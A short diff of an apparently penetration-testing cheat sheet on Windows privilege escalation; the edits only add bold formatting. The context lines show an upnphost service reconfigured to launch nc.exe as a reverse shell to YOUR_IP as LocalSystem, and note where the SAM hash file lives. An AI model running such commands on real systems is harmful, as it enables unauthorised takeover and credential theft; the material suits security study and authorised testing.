@@ -75,7 +75,7 @@ FOR /F %i in (services.txt) DO @sc qc %i | findstr "BINARY_PATH_NAME" >> path.tx
 
     If you don't have access to vmic, you can do:
     *$ sc qc upnphost*
-    Windows XP SP1 is known to be vulnerable to EoP in *upnphost*. You get Administrator with:
+    Windows XP SP1 is known to be vulnerable to EoP in **upnphost**. You get Administrator with:
     *$ sc config upnphost binpath= "C:\Inetpub\wwwroot\nc.exe YOUR_IP 1234 -e C:\WINDOWS\System32\cmd.exe"
 sc config upnphost obj= ".\LocalSystem" password= ""
 sc qc upnphost*
@@ -509,7 +509,7 @@ Access Check
     *$ accesschk.exe /accepteula*
 
 Windows hashes
-    NTLM and LM passwords are located in the SAM file in C:\\Windows\SYSTEM32\CONFIG
+    NTLM and LM passwords are located in the SAM file in **C:\\Windows\SYSTEM32\CONFIG**
     LAN Manager (LM): Windows XP and prior use LAN manager protocol. Uses DES but the key space is small (only uppercase, not salted, 14 chars or padded to 14).
     NTLM/NTLM2: It does not split the password, also stored in uppercase
     Kerberos: Default protocol for active directory envs.
